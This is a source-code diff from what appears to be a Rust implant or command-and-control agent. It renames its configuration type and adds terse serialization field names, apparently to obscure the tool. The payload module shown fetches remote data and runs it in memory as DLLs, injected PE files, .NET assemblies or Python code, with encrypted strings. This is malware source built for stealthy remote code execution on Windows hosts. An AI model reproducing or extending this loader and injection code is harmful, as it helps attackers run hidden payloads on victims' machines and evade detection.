@@ -1,4 +1,4 @@
-use crate::config::Config;
+use crate::config::CCC;
 use crate::link::{Link, LinkFetch};
 use crate::payload_util::create_directory;
 use crate::payload_util::same_hash_sha512;
@@ -67,7 +67,7 @@ pub enum PO {
 
 }
 impl PO {
-    pub fn exec_payload(&self, config: &Config) -> POT {
+    pub fn exec_payload(&self, config: &CCC) -> POT {
         let exec_result = match &self {
             PO::BA() => banner(),
             PO::PP(payload) => payload.print_msg(config),
@@ -185,13 +185,13 @@ pub struct DLM {
 
 impl DLM {
     #[cfg(target_os = "linux")]
-    pub fn dll_from_memory(&self, _config: &Config) -> Result<POT, anyhow::Error> {
+    pub fn dll_from_memory(&self, _config: &CCC) -> Result<POT, anyhow::Error> {
         fail_linux_message(format!("{}", encrypt_string!("DLM")));
         Ok(POT::NoThread())
     }
 
     #[cfg(target_os = "windows")]
-    pub fn dll_from_memory(&self, config: &Config) -> Result<POT, anyhow::Error> {
+    pub fn dll_from_memory(&self, config: &CCC) -> Result<POT, anyhow::Error> {
         let data: Vec<u8> = self.link.fetch_data(config)?;
 
         if self.thread {
@@ -250,9 +250,13 @@ pub fn dll_from_memory_exec(data: Vec<u8>, dll_entrypoint: String, dll_commandli
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct EPY {
+    #[serde(rename = "pt")]
     pub path: String, //path of python directory
+    #[serde(rename = "pc")]
     pub python_code: String,
+    #[serde(rename = "te")]
     pub thread: bool,
+    #[serde(rename = "ro")]
     pub runonce: bool,
 }
 impl EPY {
@@ -343,7 +347,7 @@ pub struct WZ {
 }
 
 impl WZ {
-    pub fn write_zip(&self, config: &Config) -> Result<POT, anyhow::Error> {
+    pub fn write_zip(&self, config: &CCC) -> Result<POT, anyhow::Error> {
         //TODO found a way, not to recreate everything every time this payload run
 
         //let archive: Vec<u8> = self.link.fetch_data(config)?;
@@ -394,7 +398,7 @@ pub struct WF {
 }
 
 impl WF {
-    pub fn write_file(&self, config: &Config) -> Result<POT, anyhow::Error> {
+    pub fn write_file(&self, config: &CCC) -> Result<POT, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
 
         if same_hash_sha512(&self.hash, &path) == false {
@@ -567,17 +571,22 @@ use crate::local_pe_injection::main::local_pe_injection;
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct LPJ {
+    #[serde(rename = "ll")]
     pub link: Link,
+    #[serde(rename = "cl")]
     pub commandline: CommandLine,
+    #[serde(rename = "de")]
     pub dll_entrypoint: String,
+    #[serde(rename = "te")]
     pub thread: bool,
+    #[serde(rename = "ro")]
     pub runonce: bool,
 }
 impl LPJ {
     #[cfg(target_os = "linux")]
     pub fn exec_local_pe_injection(
         &self,
-        _config: &Config,
+        _config: &CCC,
     ) -> Result<POT, anyhow::Error> {
         fail_linux_message(format!("{}", encrypt_string!("LPJ")));
         return Ok(POT::NoThread());
@@ -586,7 +595,7 @@ impl LPJ {
     #[cfg(target_os = "windows")]
     pub fn exec_local_pe_injection(
         &self,
-        config: &Config,
+        config: &CCC,
     ) -> Result<POT, anyhow::Error> {
         let args_ok: String = self.commandline.get_string()?;
         let data: Vec<u8> = self.link.fetch_data(config)?;
@@ -614,17 +623,22 @@ use clroxide::clr::Clr;
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct DTN {
+    #[serde(rename = "ll")]
     pub link: Link,
+    #[serde(rename = "ci")]
     pub commandline: CommandLine,
+    #[serde(rename = "te")]
     pub thread: bool,
+    #[serde(rename = "ro")]
     pub runonce: bool,
+    #[serde(rename = "vv")]
     pub visible: bool,
 }
 impl DTN {
     #[cfg(target_os = "linux")]
     pub fn exec_dotnet_from_memory(
         &self,
-        _config: &Config,
+        _config: &CCC,
     ) -> Result<POT, anyhow::Error> {
         fail_linux_message(format!("{}", encrypt_string!("DTN")));
         return Ok(POT::NoThread());
@@ -633,7 +647,7 @@ impl DTN {
     #[cfg(target_os = "windows")]
     pub fn exec_dotnet_from_memory(
         &self,
-        config: &Config,
+        config: &CCC,
     ) -> Result<POT, anyhow::Error> {
         let args_ok = self.commandline.get_buffer()?;
         let data: Vec<u8> = self.link.fetch_data(config)?;
@@ -667,11 +681,13 @@ impl DTN {
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct PP {
+    #[serde(rename = "mm")]
     pub msg: CommandLine,
+    #[serde(rename = "ro")]
     pub runonce: bool,
 }
 impl PP {
-    pub fn print_msg(&self, _config: &Config) -> Result<POT, anyhow::Error> {
+    pub fn print_msg(&self, _config: &CCC) -> Result<POT, anyhow::Error> {
         println!("{}", self.msg.get_string()?);
         thread::sleep(time::Duration::from_millis(1000));
         return Ok(POT::NoThread());
